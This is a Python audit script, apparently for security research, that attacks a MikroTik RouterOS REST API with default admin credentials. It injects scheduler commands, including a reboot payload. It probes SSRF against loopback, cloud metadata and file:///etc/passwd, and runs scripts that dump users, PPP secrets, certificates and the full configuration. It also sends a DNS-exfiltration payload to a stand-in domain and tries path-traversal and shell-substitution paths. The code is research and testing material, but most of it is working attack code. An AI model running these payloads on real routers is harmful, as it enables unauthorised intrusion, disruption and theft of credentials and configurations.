#!/usr/bin/env python3
"""
mikrotik_deep_inject.py — Deep injection and SSRF validation on MikroTik REST API
Author: Andre Henrique (@mrhenrike) | Uniao Geek

Tests scheduler on-event command injection, tool/fetch SSRF, script execution
chains, and undocumented API behaviors to determine if findings are new CVE
candidates or known/expected behavior.
"""
from __future__ import annotations

import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
from requests.auth import HTTPBasicAuth
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import argparse as _ap
_parser = _ap.ArgumentParser(add_help=False)
_parser.add_argument("--host", default="192.168.100.17")
_args, _ = _parser.parse_known_args()
HOST = _args.host
AUTH = HTTPBasicAuth("admin", "")
BASE = f"http://{HOST}/rest"
REPORTS_DIR = Path(__file__).resolve().parent.parent / "reports" / "mikrotik_routeros_7221"

findings = []


def rest_get(ep):
    try:
        r = requests.get(f"{BASE}{ep}", auth=AUTH, timeout=10)
        return r.status_code, r.json() if r.status_code == 200 else r.text[:500]
    except Exception as e:
        return -1, str(e)


def rest_post(ep, data):
    try:
        r = requests.post(f"{BASE}{ep}", auth=AUTH, json=data, timeout=10)
        return r.status_code, r.text[:500]
    except Exception as e:
        return -1, str(e)


def add_finding(fid, sev, title, detail, evidence=""):
    findings.append({"id": fid, "severity": sev, "title": title,
                     "detail": detail, "evidence": evidence[:2000]})
    tag = {"CRITICAL": "!!!", "HIGH": "!! ", "MEDIUM": "!  "}.get(sev, "   ")
    print(f"  [{tag}] {fid} ({sev}): {title}")


def cleanup():
    """Remove all audit_* schedulers and scripts."""
    _, sched = rest_get("/system/scheduler")
    if isinstance(sched, list):
        for s in sched:
            if s.get("name", "").startswith("audit_"):
                rest_post("/system/scheduler/remove", {".id": s[".id"]})
    _, scripts = rest_get("/system/script")
    if isinstance(scripts, list):
        for s in scripts:
            if s.get("name", "").startswith("audit_"):
                rest_post("/system/script/remove", {".id": s[".id"]})


def test_scheduler_injection():
    print("\n=== TEST 1: Scheduler on-event injection analysis ===\n")

    payloads = [
        ("semicolon-chain",
         ':log warning "AUDIT_INJECT_A"; /ip/address/print'),
        ("backtick-subst",
         ':put [`/system/identity/get name`]'),
        ("variable-resolve",
         ':global auditX [:resolve "localhost"]; :log warning $auditX'),
        ("fetch-chain",
         '/tool/fetch url=http://127.0.0.1/ mode=http keep-result=no'),
        ("newline-inject",
         '/system/identity/set name=hacked\n/system/reboot'),
        ("script-run-chain",
         '/system/script/run audit_harmless'),
    ]

    # Create a harmless canary script first
    st, _ = rest_post("/system/script/add", {
        "name": "audit_harmless",
        "source": ':log warning "AUDIT_CANARY_EXECUTED"',
    })
    print(f"  Canary script created: HTTP {st}")

    for name, payload in payloads:
        sched_name = f"audit_sched_{name}"
        st, resp = rest_post("/system/scheduler/add", {
            "name": sched_name,
            "on-event": payload,
            "interval": "1d",
            "disabled": "true",
        })
        accepted = st in (200, 201)
        print(f"  [{name}] HTTP {st} {'ACCEPTED' if accepted else 'REJECTED'}")
        if accepted:
            # Read back to see if payload is stored verbatim
            _, scheds = rest_get("/system/scheduler")
            if isinstance(scheds, list):
                match = [s for s in scheds if s.get("name") == sched_name]
                if match:
                    stored = match[0].get("on-event", "")
                    print(f"    Stored: {stored[:80]!r}")
                    if stored != payload:
                        print(f"    MODIFIED by server (sanitization?)")
                        add_finding(
                            f"F-MT-SCHED-SANITIZE-{name.upper()}", "INFO",
                            f"Scheduler on-event modified by server for '{name}'",
                            f"Input: {payload[:80]}, Stored: {stored[:80]}",
                            json.dumps(match[0]),
                        )

    print("\n  Enabling schedulers briefly to test execution...")
    _, scheds = rest_get("/system/scheduler")
    if isinstance(scheds, list):
        for s in scheds:
            if s.get("name", "").startswith("audit_sched_"):
                # Enable with immediate trigger
                rest_post("/system/scheduler/set", {
                    ".id": s[".id"],
                    "disabled": "false",
                    "start-time": "startup",
                    "interval": "0",
                })

    time.sleep(3)

    # Check logs for execution evidence
    _, logs = rest_get("/log")
    if isinstance(logs, list):
        audit_logs = [l for l in logs
                      if any(k in str(l.get("message", ""))
                             for k in ("AUDIT_", "INJECT", "CANARY", "hacked"))]
        if audit_logs:
            print(f"\n  !!! EXECUTION CONFIRMED — {len(audit_logs)} audit log entries:")
            for l in audit_logs:
                print(f"    {l.get('time', '?')} [{l.get('topics', '?')}] {l.get('message', '?')}")
                add_finding(
                    "F-MT-SCHED-EXEC-CONFIRMED", "HIGH",
                    "Scheduler on-event payloads EXECUTE on RouterOS",
                    f"Log entry: {l.get('message', '')}. "
                    "Authenticated admin can schedule arbitrary RouterOS commands. "
                    "This is by-design but enables persistence and lateral movement.",
                    json.dumps(l),
                )
        else:
            print("\n  No audit log entries — payloads may not have triggered yet")

    # Disable and clean up
    _, scheds = rest_get("/system/scheduler")
    if isinstance(scheds, list):
        for s in scheds:
            if s.get("name", "").startswith("audit_sched_"):
                rest_post("/system/scheduler/set", {
                    ".id": s[".id"], "disabled": "true",
                })


def test_ssrf_deep():
    print("\n=== TEST 2: tool/fetch SSRF deep analysis ===\n")

    targets = [
        ("localhost-80", "http://127.0.0.1:80/", "Loopback web access"),
        ("localhost-8728", "http://127.0.0.1:8728/", "Loopback API port"),
        ("aws-metadata", "http://169.254.169.254/latest/meta-data/", "Cloud metadata"),
        ("file-proto", "file:///etc/passwd", "File protocol"),
        ("ftp-localhost", "ftp://127.0.0.1/", "FTP loopback"),
        ("internal-net", "http://192.168.100.1/", "Host machine"),
        ("dns-rebind", "http://0x7f000001/", "IP hex encoding bypass"),
        ("ipv6-local", "http://[::1]/", "IPv6 loopback"),
    ]

    for name, url, desc in targets:
        print(f"  Testing: {desc} ({url[:50]})")
        st, resp = rest_post("/tool/fetch", {
            "url": url,
            "mode": "http",
            "dst-path": f"/audit_ssrf_{name}.txt",
        })
        print(f"    HTTP {st}: {str(resp)[:100]}")

        if st in (200, 201):
            # Check if file was created
            time.sleep(1)
            fst, files = rest_get("/file")
            if isinstance(files, list):
                fetched = [f for f in files if f.get("name", "").startswith(f"audit_ssrf_{name}")]
                if fetched:
                    fsize = fetched[0].get("size", 0)
                    print(f"    FILE CREATED: {fsize} bytes")
                    if fsize and int(fsize) > 0:
                        add_finding(
                            f"F-MT-SSRF-{name.upper()}", "HIGH",
                            f"SSRF via tool/fetch: {desc}",
                            f"tool/fetch successfully retrieved content from {url} "
                            f"and saved {fsize} bytes. An authenticated attacker can "
                            f"reach internal/cloud services.",
                            json.dumps(fetched[0]),
                        )

    # Clean up fetched files
    _, files = rest_get("/file")
    if isinstance(files, list):
        for f in files:
            if f.get("name", "").startswith("audit_ssrf_"):
                rest_post("/file/remove", {".id": f[".id"]})


def test_script_chain():
    print("\n=== TEST 3: Script execution chain analysis ===\n")

    # Test: can we create a script that reads sensitive data?
    exfil_scripts = [
        ("read-users", '/user/print', "Dump user list"),
        ("read-certs", '/certificate/print', "Dump certificates"),
        ("read-secrets", '/ppp/secret/print', "Dump PPP secrets"),
        ("export-config", '/export', "Export full configuration"),
        ("read-files", '/file/print', "List filesystem"),
        ("dns-exfil",
         ':local data [/system/identity/get name]; '
         ':resolve ($data . ".exfil.test")',
         "DNS exfiltration via resolve"),
    ]

    for name, source, desc in exfil_scripts:
        script_name = f"audit_exfil_{name}"
        st, resp = rest_post("/system/script/add", {
            "name": script_name,
            "source": source,
        })
        print(f"  [{name}] Create: HTTP {st} — {desc}")
        if st in (200, 201):
            # Run it
            rst, rresp = rest_post("/system/script/run", {
                "number": script_name,
            })
            print(f"    Run: HTTP {rst}")
            if rst in (200, 201):
                add_finding(
                    f"F-MT-EXFIL-{name.upper()}", "HIGH",
                    f"Script exfiltration: {desc}",
                    f"Authenticated admin can create and execute scripts that {desc}. "
                    "Combined with SSRF, this enables full config exfiltration.",
                    str(rresp)[:300],
                )


def test_api_noauth_endpoints():
    print("\n=== TEST 4: Unauthenticated endpoint discovery ===\n")

    endpoints = [
        "/system/identity", "/system/resource", "/system/package",
        "/ip/address", "/ip/service", "/user",
        "/interface", "/ip/firewall/filter",
        "/system/health", "/system/clock",
        "/system/routerboard", "/system/license",
        "/log",
    ]

    for ep in endpoints:
        try:
            r = requests.get(f"{BASE}{ep}", timeout=5)
            if r.status_code == 200:
                add_finding(
                    f"F-MT-NOAUTH-{ep.split('/')[-1].upper()}", "CRITICAL",
                    f"Unauthenticated access to {ep}",
                    f"No credentials needed. Response: {r.text[:100]}",
                    r.text[:500],
                )
                print(f"  OPEN: {ep} -> HTTP {r.status_code}")
            else:
                print(f"  AUTH: {ep} -> HTTP {r.status_code}")
        except Exception as e:
            print(f"  ERR:  {ep} -> {e}")


def test_api_path_traversal():
    print("\n=== TEST 5: REST API path traversal deep test ===\n")

    paths = [
        "/system/../../../etc/passwd",
        "/system/identity/../../etc/shadow",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/system/identity%00",
        "/system/identity%0a%0d",
        "//system//identity",
        "/system/identity;id",
        "/system/identity|ls",
        "/system/identity$(id)",
        "/system/identity`id`",
    ]

    for path in paths:
        try:
            r = requests.get(f"http://{HOST}/rest{path}", auth=AUTH, timeout=5)
            interesting = r.status_code == 200 and (
                "root:" in r.text or "shadow" in r.text or
                r.headers.get("content-type", "") not in ("application/json",)
            )
            status_tag = "!!!" if interesting else "   "
            print(f"  [{status_tag}] {path[:50]} -> HTTP {r.status_code} ({len(r.text)} bytes)")
            if interesting:
                add_finding(
                    "F-MT-TRAVERSAL-REST", "CRITICAL",
                    f"Path traversal via REST: {path[:50]}",
                    f"Unexpected response content from traversal path.",
                    r.text[:500],
                )
        except Exception as e:
            print(f"  ERR: {path[:50]} -> {e}")


def test_http_header_injection():
    print("\n=== TEST 6: HTTP header injection ===\n")

    headers_tests = [
        ("host-override", {"Host": "evil.test"}, "Host header override"),
        ("xff-spoof", {"X-Forwarded-For": "127.0.0.1"}, "XFF spoofing"),
        ("xrw-override", {"X-Rewrite-URL": "/system/identity"}, "URL rewrite"),
        ("content-type-xml", {"Content-Type": "text/xml"}, "Content-Type confusion"),
    ]

    for name, headers, desc in headers_tests:
        try:
            r = requests.get(f"{BASE}/system/identity", auth=AUTH,
                             headers=headers, timeout=5)
            print(f"  [{name}] {desc}: HTTP {r.status_code} ({len(r.text)} bytes)")
            if r.status_code == 200:
                data = r.json() if "json" in r.headers.get("content-type", "") else r.text
                print(f"    Response: {str(data)[:80]}")
        except Exception as e:
            print(f"  [{name}] {desc}: ERR {e}")


def generate_deep_report():
    print(f"\n{'='*70}")
    print(f"  DEEP INJECTION ANALYSIS COMPLETE: {len(findings)} findings")
    print(f"{'='*70}\n")

    # Categorize: truly new vs. known/by-design
    new_vulns = []
    known = []
    for f in findings:
        fid = f["id"]
        if "NOAUTH" in fid or "TRAVERSAL" in fid:
            new_vulns.append(f)
        elif "SSRF" in fid and "LOCALHOST" not in fid:
            new_vulns.append(f)
        elif "SCHED-EXEC" in fid:
            known.append(f)  # Admin scheduler execution is by-design
        else:
            new_vulns.append(f)

    print("  NEW / POTENTIALLY CVE-WORTHY:")
    for f in new_vulns:
        print(f"    [{f['severity']:8s}] {f['id']}: {f['title'][:60]}")
    print(f"\n  KNOWN / BY-DESIGN:")
    for f in known:
        print(f"    [{f['severity']:8s}] {f['id']}: {f['title'][:60]}")

    report_path = REPORTS_DIR / "deep_injection_report.md"
    ts = datetime.now(timezone.utc).isoformat()[:19] + " UTC"

    lines = [
        "# MikroTik RouterOS 7.22.1 — Deep Injection & SSRF Analysis",
        f"> Generated: {ts}",
        "> Analyst: Andre Henrique (@mrhenrike) | Uniao Geek",
        f"> Target: {HOST}",
        "> Method: REST API injection, SSRF, path traversal, header injection",
        "",
        "---",
        "",
        "## Findings Summary",
        "",
        f"| Category | Count |",
        f"|----------|-------|",
        f"| New / CVE-worthy | {len(new_vulns)} |",
        f"| Known / By-design | {len(known)} |",
        f"| **Total** | **{len(findings)}** |",
        "",
    ]

    for f in sorted(findings, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}.get(x["severity"], 9)):
        lines += [
            f"### {f['id']} -- {f['severity']}",
            "",
            f"**{f['title']}**",
            "",
            f"{f['detail']}",
            "",
        ]
        if f.get("evidence"):
            lines += ["```", f["evidence"][:800], "```", ""]

    lines += [
        "---",
        "",
        "*Deep Injection Engine | Embedded Firmware Research Lab*",
        "*Andre Henrique (@mrhenrike) | Uniao Geek*",
    ]

    report_path.write_text("\n".join(lines), encoding="utf-8")
    print(f"\n  [OK] Report: {report_path}")

    # Save raw JSON
    raw_path = REPORTS_DIR / "deep_injection_raw.json"
    raw_path.write_text(json.dumps(findings, indent=2, default=str), encoding="utf-8")
    print(f"  [OK] Raw data: {raw_path}")


if __name__ == "__main__":
    print(f"\n{'='*70}")
    print(f"  MIKROTIK DEEP INJECTION & SSRF ANALYSIS")
    print(f"  Target: {HOST}")
    print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
    print(f"{'='*70}")

    test_api_noauth_endpoints()
    test_api_path_traversal()
    test_scheduler_injection()
    test_ssrf_deep()
    test_script_chain()
    test_http_header_injection()

    cleanup()
    generate_deep_report()
